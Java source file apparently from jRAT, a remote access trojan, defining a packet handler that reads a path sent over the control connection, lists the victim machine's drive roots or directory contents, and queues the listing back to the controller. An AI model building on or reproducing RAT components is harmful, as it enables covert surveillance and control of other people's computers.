package jrat.module.fs.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;

import java.io.File;


public class Packet15ListFiles implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String current = con.readLine();

		File[] files;

		if (current.length() == 0) {
			files = File.listRoots();
		} else {
			files = new File(current).listFiles();
		}

		con.addToSendQueue(new Packet22ListFiles(files));
	}

}
